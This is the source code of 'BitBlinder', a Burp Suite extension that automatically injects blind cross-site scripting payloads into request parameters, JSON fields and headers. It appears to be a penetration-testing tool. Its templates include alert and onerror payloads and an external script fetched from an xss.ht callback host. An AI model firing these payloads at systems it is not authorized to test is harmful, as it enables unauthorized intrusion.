from burp import IBurpExtender
from burp import IHttpListener
from burp import ITab
from random import randint
import datetime
import sys
import time
from java.util import UUID
from threading import Lock
from java.awt import BorderLayout
from java.awt import FlowLayout
from java.awt import GridBagConstraints
from java.awt import GridBagLayout
from java.awt import GridLayout
from java.awt import Insets
from java.awt import Dimension
from javax.swing import BorderFactory
from javax.swing import BoxLayout
from javax.swing import JButton
from javax.swing import JCheckBox
from javax.swing import JComboBox
from javax.swing import JLabel
from javax.swing import JPanel
from javax.swing import JScrollPane
from javax.swing import JTable
from javax.swing import JTextArea
from javax.swing import JTextField
from javax.swing import SwingUtilities
from javax.swing.table import DefaultTableModel
from java.lang import Runnable
from java.awt.event import ComponentAdapter
import json
try:
    basestring
except NameError:
    basestring = str


class URL(object):
    PARAM_URL = 0
    PARAM_BODY = 1
    PARAM_COOKIE = 2
    PARAM_XML = 3
    PARAM_XML_ATTR = 4
    PARAM_MULTIPART_ATTR = 5
    PARAM_JSON = 6


CONFIG_KEY = "bitblinder.config"

DEFAULT_CONFIG = {
    'Randomize': False,
    'Payloads': [],
    'isEnabled': False,
    'InjectHeaders': False,
    'InjectJson': False,
    'JsonStringsOnly': True,
    'VerboseActivity': True,
    'AutoEncode': True,
    'InScopeOnly': True,
    'Headers': [
        'User-Agent',
        'Referer',
        'X-Forwarded-For',
        'X-Forwarded-Host',
        'X-Real-IP',
    ],
    'ExcludeHosts': [],
    'ExcludePaths': [],
    'ExcludeParams': [],
    'RateLimitMs': 0,
}


class Helpers(object):

    def _normalize_lines(self, text):
        lines = []
        for line in text.splitlines():
            line = line.strip()
            if line:
                lines.append(line)
        return lines

    def _safe_int(self, value, default=0):
        try:
            return int(value)
        except Exception:
            return default

    def get_payloads(self):
        payloads = self._normalize_lines(self.payloads_list.getText())
        return payloads

    def get_header_names(self):
        return self._normalize_lines(self.headers_list.getText())

    def get_exclude_hosts(self):
        return self._normalize_lines(self.exclude_hosts_list.getText())

    def get_exclude_paths(self):
        return self._normalize_lines(self.exclude_paths_list.getText())

    def get_exclude_params(self):
        return self._normalize_lines(self.exclude_params_list.getText())

    def get_rate_limit_ms(self):
        value = self._safe_int(self.rate_limit.getText(), 0)
        if value < 0:
            return 0
        return value

    def get_inject_json(self):
        return self.inject_json.isSelected()

    def get_json_strings_only(self):
        return self.json_strings_only.isSelected()

    def get_verbose_activity(self):
        return self.verbose_activity.isSelected()

    def get_auto_encode(self):
        return self.auto_encode.isSelected()

    def get_in_scope_only(self):
        return self.in_scope_only.isSelected()

    def save_settings(self, evnt=None):
        config = DEFAULT_CONFIG.copy()
        config['Randomize'] = self.randomize.isSelected()
        config['Payloads'] = self.get_payloads()
        config['isEnabled'] = self.enable.isSelected()
        config['InjectHeaders'] = self.inject_headers.isSelected()
        config['InjectJson'] = self.get_inject_json()
        config['JsonStringsOnly'] = self.get_json_strings_only()
        config['VerboseActivity'] = self.get_verbose_activity()
        config['AutoEncode'] = self.get_auto_encode()
        config['InScopeOnly'] = self.get_in_scope_only()
        config['Headers'] = self.get_header_names()
        config['ExcludeHosts'] = self.get_exclude_hosts()
        config['ExcludePaths'] = self.get_exclude_paths()
        config['ExcludeParams'] = self.get_exclude_params()
        config['RateLimitMs'] = self.get_rate_limit_ms()

        try:
            if not getattr(self, "callbacks", None):
                raise Exception("Burp callbacks not set")
            self.callbacks.saveExtensionSetting(CONFIG_KEY, json.dumps(config))
            if hasattr(self, "append_activity"):
                self.append_activity("Settings saved")
            if hasattr(self, "update_validation"):
                self.update_validation()
        except Exception as exc:
            if hasattr(self, "append_activity"):
                self.append_activity("Failed to save settings: %s" % exc)
        return

    def load_settings(self, evnt=None):
        config = DEFAULT_CONFIG.copy()

        try:
            if not getattr(self, "callbacks", None):
                raise Exception("Burp callbacks not set")
            raw = self.callbacks.loadExtensionSetting(CONFIG_KEY)
            if raw:
                loaded = json.loads(raw)
                config.update(loaded)
                if hasattr(self, "append_activity"):
                    self.append_activity("Settings loaded")
            if hasattr(self, "update_validation"):
                self.update_validation()
        except Exception as exc:
            if hasattr(self, "append_activity"):
                self.append_activity("Failed to load settings: %s" % exc)

        self.enable.setSelected(bool(config.get('isEnabled', False)))
        self.randomize.setSelected(bool(config.get('Randomize', False)))
        self.payloads_list.setText('\n'.join(config.get('Payloads', [])))
        self.inject_headers.setSelected(bool(config.get('InjectHeaders', False)))
        self.inject_json.setSelected(bool(config.get('InjectJson', False)))
        self.json_strings_only.setSelected(bool(config.get('JsonStringsOnly', True)))
        self.verbose_activity.setSelected(bool(config.get('VerboseActivity', True)))
        self.auto_encode.setSelected(bool(config.get('AutoEncode', True)))
        self.in_scope_only.setSelected(bool(config.get('InScopeOnly', True)))
        self.headers_list.setText('\n'.join(config.get('Headers', [])))
        self.exclude_hosts_list.setText('\n'.join(config.get('ExcludeHosts', [])))
        self.exclude_paths_list.setText('\n'.join(config.get('ExcludePaths', [])))
        self.exclude_params_list.setText('\n'.join(config.get('ExcludeParams', [])))
        self.rate_limit.setText(str(config.get('RateLimitMs', 0)))

        return


class GUI(Helpers):

    MAX_LOG_ROWS = 500
    PAYLOAD_PREVIEW_LIMIT = 120
    PAYLOAD_TEMPLATES = [
        ("Basic script tag", "\"><script>alert(1)</script>"),
        ("External script (uuid)", "\"><script src=\"https://$(uuid).xss.ht\"></script>"),
        ("SVG onload", "\"><svg/onload=alert(1)>"),
        ("Event handler", "\"><img src=x onerror=alert(1)>"),
    ]

    def _run_on_ui(self, fn):
        class _Runner(Runnable):
            def __init__(self, func):
                self.func = func

            def run(self):
                self.func()
        SwingUtilities.invokeLater(_Runner(fn))

    def _build_section(self, title, layout="box"):
        panel = JPanel()
        panel.setBorder(BorderFactory.createTitledBorder(title))
        if layout == "border":
            panel.setLayout(BorderLayout())
        else:
            panel.setLayout(BoxLayout(panel, BoxLayout.Y_AXIS))
        return panel

    def _build_text_area(self, rows):
        area = JTextArea(rows, 40)
        area.setLineWrap(True)
        area.setWrapStyleWord(True)
        return area

    def _add_row(self, panel, components):
        row = JPanel(FlowLayout(FlowLayout.LEFT))
        for comp in components:
            row.add(comp)
        panel.add(row)

    def _section_general(self):
        panel = self._build_section("General", layout="box")

        self.enable = JCheckBox("Enable scanning")
        self.randomize = JCheckBox("Randomize payloads")
        self.randomize.setToolTipText("Pick a random payload per injection.")
        self.inject_headers = JCheckBox("Inject headers")
        self.inject_headers.setToolTipText("Inject payloads into the header names below.")
        self.inject_json = JCheckBox("Inject JSON body")
        self.inject_json.setToolTipText("Inject payloads into JSON request bodies.")
        self.json_strings_only = JCheckBox("JSON: only replace string values")
        self.json_strings_only.setToolTipText("If enabled, only string values are replaced.")
        self.verbose_activity = JCheckBox("Verbose activity (payload details)")
        self.verbose_activity.setToolTipText("Show payload details in the status line.")
        self.auto_encode = JCheckBox("Auto-encode payloads for URL/body")
        self.auto_encode.setToolTipText("If disabled, payloads are inserted raw into URL/body params.")
        self.in_scope_only = JCheckBox("In-scope only")
        self.in_scope_only.setToolTipText("If enabled, only in-scope items are processed.")

        self._add_row(panel, [
            self.enable,
            self.randomize,
            self.inject_headers,
            self.inject_json,
            self.json_strings_only,
            self.verbose_activity,
            self.auto_encode,
            self.in_scope_only,
        ])


        self.rate_limit = JTextField("0", 6)
        self.rate_limit.setToolTipText("Milliseconds between injections per host:port.")
        self._add_row(panel, [JLabel("Rate limit (ms, 0 = off):"), self.rate_limit])

        return panel

    def _section_payloads(self):
        panel = self._build_section("Payloads (line separated)", layout="border")
        template_row = JPanel(FlowLayout(FlowLayout.LEFT))
        template_row.add(JLabel("Template:"))
        self.payload_template = JComboBox([t[0] for t in self.PAYLOAD_TEMPLATES])
        self.payload_add_btn = JButton("Add", actionPerformed=self.add_payload_template)
        template_row.add(self.payload_template)
        template_row.add(self.payload_add_btn)
        panel.add(template_row, BorderLayout.NORTH)
        self.payloads_list = self._build_text_area(8)
        panel.add(JScrollPane(self.payloads_list), BorderLayout.CENTER)
        return panel

    def _section_headers(self):
        panel = self._build_section("Header injection list (line separated)", layout="border")
        self.headers_list = self._build_text_area(5)
        panel.add(JScrollPane(self.headers_list), BorderLayout.CENTER)
        return panel

    def _section_exclusions(self):
        panel = self._build_section("Exclusions", layout="border")
        self.exclusions_grid = JPanel(GridLayout(1, 3, 8, 0))

        hosts_panel = JPanel(BorderLayout())
        hosts_panel.add(JLabel("Hosts"), BorderLayout.NORTH)
        self.exclude_hosts_list = self._build_text_area(5)
        hosts_panel.add(JScrollPane(self.exclude_hosts_list), BorderLayout.CENTER)

        paths_panel = JPanel(BorderLayout())
        paths_panel.add(JLabel("Paths"), BorderLayout.NORTH)
        self.exclude_paths_list = self._build_text_area(5)
        paths_panel.add(JScrollPane(self.exclude_paths_list), BorderLayout.CENTER)

        params_panel = JPanel(BorderLayout())
        params_panel.add(JLabel("Params"), BorderLayout.NORTH)
        self.exclude_params_list = self._build_text_area(5)
        params_panel.add(JScrollPane(self.exclude_params_list), BorderLayout.CENTER)

        self.exclusions_grid.add(hosts_panel)
        self.exclusions_grid.add(paths_panel)
        self.exclusions_grid.add(params_panel)

        panel.add(self.exclusions_grid, BorderLayout.CENTER)
        return panel

    def _section_controls(self):
        panel = self._build_section("Actions", layout="box")
        self.save_btn = JButton("Save", actionPerformed=self.save_settings)
        self.reload_btn = JButton("Reload", actionPerformed=self.load_settings)
        self.clear_log_btn = JButton("Clear log", actionPerformed=self.clear_log)
        self._add_row(panel, [self.save_btn, self.reload_btn, self.clear_log_btn])
        self.validation_label = JLabel(" ")
        panel.add(self.validation_label)
        return panel

    def _section_log(self):
        panel = JPanel(BorderLayout())
        panel.setBorder(BorderFactory.createTitledBorder("Activity"))

        self.log_model = DefaultTableModel(
            ["Time", "Host", "Method", "Path", "Injected", "Notes"], 0
        )
        self.log_table = JTable(self.log_model)
        panel.add(JScrollPane(self.log_table), BorderLayout.CENTER)

        self.status_label = JLabel("Ready")
        panel.add(self.status_label, BorderLayout.SOUTH)
        return panel

    def gui(self):
        self.panel = JPanel(BorderLayout())

        settings_panel = JPanel(GridBagLayout())
        constraints = GridBagConstraints()
        constraints.gridx = 0
        constraints.weightx = 1.0
        constraints.insets = Insets(6, 6, 6, 6)
        constraints.fill = GridBagConstraints.HORIZONTAL

        sections = [
            (self._section_general(), 0.0, GridBagConstraints.HORIZONTAL),
            (self._section_payloads(), 0.6, GridBagConstraints.BOTH),
            (self._section_headers(), 0.2, GridBagConstraints.BOTH),
            (self._section_exclusions(), 0.2, GridBagConstraints.BOTH),
            (self._section_controls(), 0.0, GridBagConstraints.HORIZONTAL),
        ]

        for index, (section, weighty, fill) in enumerate(sections):
            constraints.gridy = index
            constraints.weighty = weighty
            constraints.fill = fill
            settings_panel.add(section, constraints)

        settings_scroll = JScrollPane(settings_panel)
        settings_scroll.getVerticalScrollBar().setUnitIncrement(12)
        settings_scroll.setHorizontalScrollBarPolicy(JScrollPane.HORIZONTAL_SCROLLBAR_NEVER)
        settings_scroll.setMinimumSize(Dimension(200, 200))
        activity_panel = self._section_log()
        activity_panel.setMinimumSize(Dimension(200, 180))
        activity_panel.setPreferredSize(Dimension(200, 220))

        self.panel.add(settings_scroll, BorderLayout.CENTER)
        self.panel.add(activity_panel, BorderLayout.SOUTH)

        owner = self

        class _ResizeAdapter(ComponentAdapter):
            def componentResized(self, event):
                width = owner.panel.getWidth()
                if width <= 700:
                    owner.exclusions_grid.setLayout(GridLayout(3, 1, 8, 8))
                else:
                    owner.exclusions_grid.setLayout(GridLayout(1, 3, 8, 0))
                owner.exclusions_grid.revalidate()
                owner.exclusions_grid.repaint()

        self.panel.addComponentListener(_ResizeAdapter())

        return self

    def set_status(self, text):
        def _update():
            self.status_label.setText(text)
        self._run_on_ui(_update)

    def add_log(self, row):
        def _update():
            self.log_model.addRow(row)
            if self.log_model.getRowCount() > self.MAX_LOG_ROWS:
                self.log_model.removeRow(0)
        self._run_on_ui(_update)

    def append_activity_detail(self, text):
        if not self.get_verbose_activity():
            return
        self.set_status(text)

    def append_activity(self, text):
        self.set_status(text)

    def format_payload(self, payload):
        if payload is None:
            return ""
        if len(payload) > self.PAYLOAD_PREVIEW_LIMIT:
            return payload[:self.PAYLOAD_PREVIEW_LIMIT] + "..."
        return payload

    def add_payload_template(self, evnt=None):
        index = self.payload_template.getSelectedIndex()
        if index < 0:
            return
        payload = self.PAYLOAD_TEMPLATES[index][1]
        current = self.payloads_list.getText().strip()
        if current:
            self.payloads_list.setText(current + "\n" + payload)
        else:
            self.payloads_list.setText(payload)
        self.update_validation()

    def update_validation(self):
        warnings = []
        if not self.get_payloads():
            warnings.append("Add at least one payload.")
        if self.inject_headers.isSelected() and not self.get_header_names():
            warnings.append("Header injection enabled but list is empty.")
        if self.get_inject_json():
            warnings.append("JSON injection requires valid JSON bodies.")
        if not self.get_auto_encode():
            warnings.append("Auto-encode is off: payloads are inserted raw.")
        if warnings:
            self.validation_label.setText("Warning: " + " ".join(warnings))
        else:
            self.validation_label.setText(" ")

    def clear_log(self, evnt=None):
        def _update():
            self.log_model.setRowCount(0)
        self._run_on_ui(_update)


OP_INJECTION_PARAMS = [
    URL.PARAM_URL,
    URL.PARAM_BODY,
]

OP_IGNORE_HEADER = "X-Blinder-Ignore"

OP_DEBUG_MODE = 0
OP_DEBUG_SERVER = "127.0.0.1"
OP_DEBUG_PORT = 80
OP_DEBUG_USE_HTTPS = 0
OP_SHOW_OUT_OF_SCOPE = 0


class BurpExtender(IBurpExtender, IHttpListener, ITab):

    def getTabCaption(self):
        # Setting extension tab name
        return "Bit Blinder"

    def getUiComponent(self):
        # Returning instance of the panel as in burp's docs
        return self.ui.panel

    def registerExtenderCallbacks(self, callbacks):
        gui = GUI()
        self.ui = gui.gui()
        self.ui.callbacks = callbacks

        # Registering callbacks from burp api
        self.callbacks = callbacks
        self.callbacks.setExtensionName("BIT/Blinder")
        self.callbacks.registerHttpListener(self)

        # Redirect the stdout to burp stdout
        sys.stdout = self.callbacks.getStdout()

        # Saving IExtensionHelpers to use later
        self.helpers = self.callbacks.getHelpers()

        # Settings up the main gui
        self.callbacks.customizeUiComponent(self.ui.panel)
        self.callbacks.addSuiteTab(self)
        self.ui.load_settings()

        self.rate_lock = Lock()
        self.last_request_ms = {}
        self.stats = {
            'total': 0,
            'sent': 0,
            'skipped': 0,
        }

        self.ui.append_activity("BitBlinder 0.6 loaded (in-scope only)")
        return

    def _update_status(self):
        text = "Requests: %d | Injected: %d | Skipped: %d" % (
            self.stats['total'], self.stats['sent'], self.stats['skipped']
        )
        self.ui.set_status(text)

    def _has_ignore_header(self, headers):
        target = OP_IGNORE_HEADER.lower()
        for header in headers:
            parts = header.split(":", 1)
            if len(parts) != 2:
                continue
            name = parts[0].strip().lower()
            value = parts[1].strip().lower()
            if name == target and value == "yes":
                return True
        return False

    def _is_excluded_host(self, host, exclude_hosts):
        host_lower = host.lower()
        for item in exclude_hosts:
            item_lower = item.lower()
            if host_lower == item_lower:
                return True
            if host_lower.endswith("." + item_lower):
                return True
        return False

    def _is_excluded_path(self, path, exclude_paths):
        for item in exclude_paths:
            if path == item:
                return True
            if path.startswith(item):
                return True
        return False

    def _select_payload(self, payloads):
        if not payloads:
            return None
        if self.ui.randomize.isSelected():
            return payloads[randint(0, len(payloads) - 1)]
        return payloads[0]

    def _render_payload(self, payload):
        if payload is None:
            return None, None
        if "$(uuid)" in payload:
            uuid_value = str(UUID.randomUUID())
            return payload.replace("$(uuid)", uuid_value), uuid_value
        return payload, None

    def _format_json_path(self, path):
        parts = []
        for item in path:
            if isinstance(item, int):
                parts.append("[%d]" % item)
            else:
                if not parts:
                    parts.append(str(item))
                else:
                    parts.append(".%s" % item)
        return "".join(parts) if parts else "$"

    def _add_header(self, headers, name, value):
        new_headers = list(headers)
        new_headers.append("%s: %s" % (name, value))
        return self._ensure_ignore_header(new_headers)

    def _ensure_ignore_header(self, headers):
        if self._has_ignore_header(headers):
            return list(headers)
        new_headers = list(headers)
        new_headers.append("%s: yes" % OP_IGNORE_HEADER)
        return new_headers

    def _has_chunked(self, headers):
        for header in headers:
            if header.lower().startswith("transfer-encoding:"):
                if "chunked" in header.lower():
                    return True
        return False

    def _set_content_length(self, headers, body_bytes):
        if self._has_chunked(headers):
            return list(headers)
        length = len(body_bytes)
        new_headers = []
        has_length = False
        for header in headers:
            if header.lower().startswith("content-length:"):
                new_headers.append("Content-Length: %d" % length)
                has_length = True
            else:
                new_headers.append(header)
        if not has_length and length > 0:
            new_headers.append("Content-Length: %d" % length)
        return new_headers

    def _is_json_request(self, headers, body_text):
        content_type = ""
        for header in headers:
            if header.lower().startswith("content-type:"):
                content_type = header.split(":", 1)[1].strip().lower()
                break
        if "json" in content_type:
            return True
        sample = body_text.lstrip()
        return sample.startswith("{") or sample.startswith("[")

    def _json_collect_paths(self, obj, strings_only):
        paths = []

        def _walk(node, path):
            if isinstance(node, dict):
                for key, value in node.items():
                    _walk(value, path + [key])
            elif isinstance(node, list):
                for index, value in enumerate(node):
                    _walk(value, path + [index])
            else:
                if strings_only and not isinstance(node, basestring):
                    return
                paths.append(path)

        _walk(obj, [])
        return paths

    def _json_set_path(self, obj, path, value):
        if not path:
            return value
        current = obj
        for key in path[:-1]:
            current = current[key]
        current[path[-1]] = value
        return obj

    def _json_clone(self, obj):
        return json.loads(json.dumps(obj))

    def _replace_query_param(self, text, name, payload):
        if text is None:
            return text, False
        segments = text.split("&") if text else []
        replaced = False
        new_segments = []
        for seg in segments:
            if "=" in seg:
                key, value = seg.split("=", 1)
                if key == name:
                    new_segments.append(key + "=" + payload)
                    replaced = True
                else:
                    new_segments.append(seg)
            else:
                if seg == name:
                    new_segments.append(name + "=" + payload)
                    replaced = True
                else:
                    new_segments.append(seg)
        if not segments:
            return text, False
        return "&".join(new_segments), replaced

    def _update_param_raw(self, request, param, payload):
        request_str = self.helpers.bytesToString(request)
        marker = "\r\n\r\n"
        idx = request_str.find(marker)
        if idx == -1:
            return None
        header_text = request_str[:idx]
        body_text = request_str[idx + len(marker):]

        lines = header_text.split("\r\n")
        if not lines:
            return None
        request_line = lines[0]
        parts = request_line.split(" ")
        if len(parts) < 2:
            return None

        name = param.getName()
        ptype = param.getType()

        if ptype == URL.PARAM_URL:
            path = parts[1]
            if "?" not in path:
                return None
            base, query = path.split("?", 1)
            new_query, replaced = self._replace_query_param(query, name, payload)
            if not replaced:
                return None
            parts[1] = base + "?" + new_query
            lines[0] = " ".join(parts)
            new_request = "\r\n".join(lines) + marker + body_text
            return self.helpers.stringToBytes(new_request)

        if ptype == URL.PARAM_BODY:
            if not body_text:
                return None
            new_body, replaced = self._replace_query_param(body_text, name, payload)
            if not replaced:
                return None
            new_request = header_text + marker + new_body
            return self.helpers.stringToBytes(new_request)

        return None

    def _send_request(self, http_service, request):
        if OP_DEBUG_MODE:
            service = self.helpers.buildHttpService(
                OP_DEBUG_SERVER, OP_DEBUG_PORT, OP_DEBUG_USE_HTTPS
            )
        else:
            service = http_service
        return self.callbacks.makeHttpRequest(service, request)

    def processHttpMessage(self, toolFlag, messageIsRequest, messageInfo):
        # Check if tool is enabled from the gui panel
        if not self.ui.enable.isSelected():
            return

        # Check if it's not a request from burp
        if not messageIsRequest:
            return

        request = messageInfo.getRequest()
        requestInfo = self.helpers.analyzeRequest(messageInfo)
        url = requestInfo.getUrl()

        # Check if the url in the scope
        if self.ui.get_in_scope_only() and (not self.callbacks.isInScope(url)):
            return

        headers = list(requestInfo.getHeaders())
        paramters = requestInfo.getParameters()
        if self._has_ignore_header(headers):
            return

        http_service = messageInfo.getHttpService()
        host = http_service.getHost()
        path = requestInfo.url.getPath()
        method = requestInfo.getMethod()

        if self.ui.get_in_scope_only():
            self.ui.append_activity("In-scope request: %s %s%s" % (method, host, path))
        else:
            self.ui.append_activity("Request: %s %s%s" % (method, host, path))

        exclude_hosts = self.ui.get_exclude_hosts()
        exclude_paths = self.ui.get_exclude_paths()
        exclude_params = [p.lower() for p in self.ui.get_exclude_params()]

        if self._is_excluded_host(host, exclude_hosts):
            self.stats['skipped'] += 1
            self.stats['total'] += 1
            self.ui.add_log([
                self._now(), host, method, path, "0", "Excluded host"
            ])
            self._update_status()
            return

        if self._is_excluded_path(path, exclude_paths):
            self.stats['skipped'] += 1
            self.stats['total'] += 1
            self.ui.add_log([
                self._now(), host, method, path, "0", "Excluded path"
            ])
            self._update_status()
            return

        rate_limit_ms = self.ui.get_rate_limit_ms()
        if rate_limit_ms > 0:
            now_ms = int(time.time() * 1000)
            rate_key = "%s:%s" % (host, http_service.getPort())
            with self.rate_lock:
                last = self.last_request_ms.get(rate_key, 0)
                if last and (now_ms - last) < rate_limit_ms:
                    self.stats['skipped'] += 1
                    self.stats['total'] += 1
                    self.ui.add_log([
                        self._now(), host, method, path, "0", "Rate limited"
                    ])
                    self._update_status()
                    return
                self.last_request_ms[rate_key] = now_ms

        payloads = self.ui.get_payloads()
        if not payloads:
            self.stats['skipped'] += 1
            self.stats['total'] += 1
            self.ui.add_log([
                self._now(), host, method, path, "0", "No payloads"
            ])
            self._update_status()
            return

        https = 1 if http_service.getProtocol().lower() == "https" else 0
        port = http_service.getPort()
        body = request[requestInfo.getBodyOffset():]
        body_text = self.helpers.bytesToString(body)

        vparams = [
            p for p in paramters
            if p.getType() in OP_INJECTION_PARAMS and p.getName().lower() not in exclude_params
        ]

        json_paths = []
        json_object = None
        json_error = False
        if self.ui.get_inject_json() and self._is_json_request(headers, body_text):
            try:
                json_object = json.loads(body_text)
                json_paths = self._json_collect_paths(
                    json_object, self.ui.get_json_strings_only()
                )
            except Exception:
                json_error = True

        req_time = datetime.datetime.now().strftime('%m/%d|%H:%M:%S')

        injection_points = len(vparams) + len(json_paths)
        if self.ui.inject_headers.isSelected():
            injection_points += len(self.ui.get_header_names())
        self.ui.append_activity(
            "[%s] %s %s%s (points: %s)" % (req_time, method, host, path, injection_points)
        )

        sent_count = 0

        for paramter in vparams:
            name = paramter.getName()
            ptype = paramter.getType()
            payload, uuid_value = self._render_payload(self._select_payload(payloads))
            if payload is None:
                continue
            if self.ui.get_auto_encode():
                updated_param = self.helpers.buildParameter(name, payload, ptype)
                updated_request = self.helpers.updateParameter(request, updated_param)
            else:
                updated_request = self._update_param_raw(request, paramter, payload)
                if not updated_request:
                    continue

            updated_info = self.helpers.analyzeRequest(updated_request)
            updated_headers = list(updated_info.getHeaders())
            updated_body = updated_request[updated_info.getBodyOffset():]
            updated_headers = self._ensure_ignore_header(updated_headers)
            updated_headers = self._set_content_length(updated_headers, updated_body)

            final_request = self.helpers.buildHttpMessage(updated_headers, updated_body)
            self._send_request(http_service, final_request)
            sent_count += 1
            preview = self.ui.format_payload(payload)
            detail = "Injected param %s=%s" % (name, preview)
            if uuid_value:
                detail += " uuid=%s" % uuid_value
            self.ui.append_activity_detail(detail)

        for path in json_paths:
            payload, uuid_value = self._render_payload(self._select_payload(payloads))
            if payload is None:
                continue
            updated_json = self._json_clone(json_object)
            updated_json = self._json_set_path(updated_json, path, payload)
            updated_body_text = json.dumps(updated_json)
            updated_body_bytes = self.helpers.stringToBytes(updated_body_text)
            injected_headers = self._ensure_ignore_header(headers)
            injected_headers = self._set_content_length(injected_headers, updated_body_bytes)
            updated_request = self.helpers.buildHttpMessage(injected_headers, updated_body_bytes)
            self._send_request(http_service, updated_request)
            sent_count += 1
            preview = self.ui.format_payload(payload)
            json_path = self._format_json_path(path)
            detail = "Injected json %s=%s" % (json_path, preview)
            if uuid_value:
                detail += " uuid=%s" % uuid_value
            self.ui.append_activity_detail(detail)

        if self.ui.inject_headers.isSelected():
            header_names = self.ui.get_header_names()
            for header_name in header_names:
                if header_name.lower() == OP_IGNORE_HEADER.lower():
                    continue
                if header_name.lower() in ("content-length", "transfer-encoding"):
                    continue
                payload, uuid_value = self._render_payload(self._select_payload(payloads))
                if payload is None:
                    continue
                injected_headers = self._add_header(headers, header_name, payload)
                injected_headers = self._set_content_length(injected_headers, body)
                updated_request = self.helpers.buildHttpMessage(injected_headers, body)
                self._send_request(http_service, updated_request)
                sent_count += 1
                preview = self.ui.format_payload(payload)
                detail = "Injected header %s=%s" % (header_name, preview)
                if uuid_value:
                    detail += " uuid=%s" % uuid_value
                self.ui.append_activity_detail(detail)

        self.stats['total'] += 1
        if sent_count == 0:
            self.stats['skipped'] += 1
            if json_error:
                note = "Invalid JSON"
            else:
                note = "No injection points"
        else:
            self.stats['sent'] += sent_count
            note = "Sent %d" % sent_count

        self.ui.add_log([
            self._now(), host, method, path, str(sent_count), note
        ])
        self._update_status()
        return

    def _now(self):
        return datetime.datetime.now().strftime('%m/%d|%H:%M:%S')
